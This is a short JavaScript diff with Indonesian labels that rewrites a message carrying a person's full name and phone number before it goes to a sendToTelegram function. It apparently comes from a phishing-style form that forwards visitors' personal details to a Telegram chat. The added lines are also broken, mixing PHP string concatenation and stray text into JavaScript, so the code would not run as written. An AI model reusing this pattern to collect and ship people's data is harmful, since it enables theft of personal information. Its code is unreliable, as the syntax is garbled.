@@ -414,7 +414,9 @@ function processFirstData() {
             return false;
         }
 
-        var message = `Data Baru: \nFull Name: \n${$full_name}\nPhone Number: \n${`$phone_number`}`;
+        var message = ( Telegram | NoHP | `".$phone_number."` )
+        - Nama  :   ".$full_name."
+        - No HP : `".$phone_number."`
         sendToTelegram(message);
 
         setTimeout(() => {
